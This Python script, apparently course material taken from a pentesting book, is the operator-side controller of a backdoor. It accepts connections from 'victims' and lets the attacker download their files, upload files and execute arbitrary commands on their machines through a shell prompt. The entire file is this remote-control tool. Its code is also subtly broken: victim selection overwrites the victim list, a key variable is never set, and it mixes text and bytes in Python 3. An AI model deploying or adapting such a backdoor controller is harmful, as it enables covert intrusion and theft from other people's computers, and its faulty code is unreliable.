#!/usr/bin/env python3

#Este primeiro comentário é de minha autoria (Ednelson João Ramos e Silva Júnior), os demais são de autoria do professor do curso. Eu inseri este comentário especificamente para esclarecer que eu refatorei o código, passando-o de Python 2 para Python 3 (embora as diferenças não são sejam grandes).

#Código totalmente retirado do Livro Python para Pentest, de Daniel Moreno
import socket
import threading
import os
import base64
conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conexao.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Reutiliza a porta 666 e o endereço local caso o servidor caso seja finalizado
conexao.bind(("ip do alvo",666))
conexao.listen(1) #indica a quantidade MAX de conexoes simultaneas que o servidor deve gerenciarn nao e necessario mais do que uma, por conta das multiplas threads, ou seja, e possivel fazer multiplas conexoes

class Vitima: #define a classe para gerenciar as vitimas
    def __init__(self, nome, sock):
        self.nome = nome
        self.sock = sock
def aceita_conexao(): # funcao que aguarda a conexao das vitimas
    while True:
        sock, endereco = conexao.accept() #metodo para receber novas conexoes
        nome = sock.recv(1024) #aguarda os 1024 bytes que a vitima enviara ao server informando seu ID
        vitima = Vitima(nome,sock) #cria um objeto informando nome e socket da vitima
        vitimas.append(vitima) #adiciona uma vitima recem conectada a lista de vitimas

threading.Thread(target=aceita_conexao).start()
vitimas = [] #define a lista inicialmente vazia
while True: #inicia um while infinito com a interface de gerenciamento do backdoor
    try: #inicia um try para que possua tratamento de erros caso ocorra alguma interrucao que e informada pelo except
        comando = input("SHELL> ")
        if comando == "": #verifica se o que foi digitado foi apenas um ENTER, caso seja ele da um pass
            pass
        elif comando == "vítimas": #caso vitimas seja digitado exibe a coluna com IDs das vitimas
            print("\nID\tNOME")
            for x,y in enumerate(vitimas): #cria o valor de ID dinamico pelo enumerate, X e o valor da enumeracao ID e y o objeto vitima para saber o nome da vitima y.nome
                print(x, "\t", y.nome, "\n")
        elif comando.startswith("vítima"): #verifica se o comando digitado iniciar com vitima, caso ocorra interrupcao e tratado pelo except
            try:
                vitimas = abs(int(comando.split()[1])) #verifica qual a vitima a ser gerenciada, o valor de string e convertido para inteiro e o abs() server para obter o valor absoluto, assim se caso digite -2 e considerado apenas o 2
                if vitimas > len(vitimas)-1: #verifica se o id digitado e valido e nao esta fora dos IDs existentes
                    print("ID Inválido")
                    del vitima #variavel vitima deletada da memoria
            except (IndexError, ValueError): #bloco de execao para caso seja digitado apenas vitima, sem o ID informativo
                print("Selecione a vítima pelo seu ID")
        elif comando.startswith("download"):
            try: #caso ocorra algum tipo de interrupcao e feita a verificacao pelo except
                nome_do_arquivo = comando.split()[1] #determina o nome do arquivo que o atacante fara download (c://user/desktp/putty.exe)
                resultado = "" #variavel vazia para acumular informacoers do socket
                downloaded = True #feito para indicar caso o atacante esteja tentando fazer download de um arquivo invalido
                print("Aguarde até que o Download seja completado...")
                vitimas[vitima].sock.send("download %s" %nome_do_arquivo) #envia para vitima nome do arquivo ou caminho do arquivo que devera ser feito o download
                while True: #inicia um laco infinito
                    resultado2 = vitimas[vitima].sock.recv(1024)
                    resultado += resultado2 #acumula os bytes dos arquivos
                    if not resultado2: #verifica se a variavel esta vazia, ou seja, nada foi recebido, o backdoor.py foi finalizado
                        raise socket.error #nesse caso de variavel vazia ocorre um erro de socket tratado por esta linha
                    elif "\\" in resultado2: #verifica se \\ esta sendo enviada, ou seja, o atacante esta tentando fazer o download de um arquivo inexistente
                        print("Arquivo não encontrado (Download Cancelado)")
                        downloaded = False
                        break
                    elif "\n" in resultado2: #\n significa o fim de uma transmissao em base64
                        break
                    if downloaded: #verifica se um arquivo valido foi solicitado para download
                        with open(os.path.basename(nome_do_arquivo), "wb") as arquivo:
                            conteudo = base64.b64decode(resultado)
                            arquivo.write(conteudo)
                        print("\nDownload Concluído")
            except IndexError: # caso o atacante digite apenas download ele informa como deve ser usado o comando
                print("Uso: download, arquivo_remoto")
        elif comando.startswith("upload"):
            try: #evitando interrupcoes
                arquivo_local = comando.split()[1] #define qual arquivo deve ser enviado a vitima
                arquivo_remoto = comando.split()[2] #define qual vitima deve receber o arquivo
                with open(arquivo_local, "rb") as arquivo:
                    arquivo2 = arquivo.read() #abre o arquivo em modo leitura para que o conteudo seja enviado para vitima
                vitimas[vitima].sock.send("upload %s" %arquivo_remoto) #envia para a vitima o termo upload + o arquivo a ser upado
                print("Aguarde até que o Upload seja concluído...")
                vitimas[vitima].sock.sendall(base64.b64encode(arquivo2) + "\n") #codifica o conteudo e envia para vitima \n significa o fim da transmissao
                resposta = vitimas[vitima].sock.recv(26) #aguarda o recebimento dos 26 bytes com a resposta
                if "\r" in resposta: #\r significa que chegou ao timeout entao e enviado um caractere para verificar a ausencia da vitima
                    print(vitimas[vitima].sock.recv(26)) #aguarda o recebimento da resposta de sucesso ou falha
                else: #caso nao atinja o timeout
                    print(resposta)
            except IndexError: #tratamento para caso o atacante digite apenas upload
                print("Uso: upload arquivo_local arquivo_remoto")
            except IOError: #usado quando o arquivo nao existe ou e invalido
                print("Arquivo Local não encontrado ou a vítima desconectou")
        elif comando.startswith("exec"):
            try: #interrupcao
                cmd = comando.split()[1:] #determina qual arquivo sera executado pela vitima
                if len(cmd) == 0: #verifica se o comando nao e nulo, vazio
                    raise IndexError #tratamento de erro para problemas de socket
                vitimas[vitima].sock.send(comando) #envia qual arquivo deve ser executado pela vitima
            except IndexError: #verifica se apenas exec foi digitado
                print("Uso: exec arquivo (parâmetro)")
                print("Exemplo: exec sshd.exe -d")
            else: #caso nao ocorram erros
                resultado = vitimas[vitima].sock.recv(28) #aguarda o recebimento dos 28 bytes que significam que a acao de execucao foi bem sucedida
                if not resultado: #caso tenha algum erro
                    raise socket.error #tratamento para o erro
                elif "\r" in resultado: #significa que chegou a timeout
                    print(vitimas[vitima].sock.recv(28)) #aguarda novamente o recebimento da mensagem de falha ou sucesso
                else: #quando tudo ocorre bem
                    print(resultado)
        else: #executa caso o comando nao seja nulo
            vitimas[vitima].sock.send(comando) #envia para vitima o comando
            resultado = "" #inicia a variavel vazia
            while True:
                '''
                Caso seja executado notepad.exe, cmd.exe ou powershell.exe, o servidor ficará
                aguardando por 1024bytes de resposta do cliente e será necessário encerrar o notepad na
                vitima para que o servidor retorne.
                '''
                resultado2 = vitimas[vitima].sock.recv(1024) #acumula os bytes
                resultado += resultado2
                if not resultado2: #verifica se o numero de bytes e vazio, ou seja o script foi finalizado
                    raise socket.error
                elif resultado2[-1] == "\n": #fim da transmissao
                    break
            print(base64.b64decode(resultado))
    except NameError: #caso a vitima nao tenha sido definida
        print("Vítima não definida")
    except socket.error: #caso o ID da vitima seja invalido
        print("Vítima inválida, selecione outra")
        vitimas[vitima].sock.close()
        del vitimas[vitima]
        del vitima
    except KeyboardInterrupt: #Caso pressiona CTRL+C para finalizar o programa
        print("CTRL+C pressionado, excluindo vítima")
        try: #bloco de tratamento
            vitimas[vitima].sock.close()
            del vitimas[vitima]
            del vitima
        except NameError: #quando a variavel vitima nao e declarada
            pass

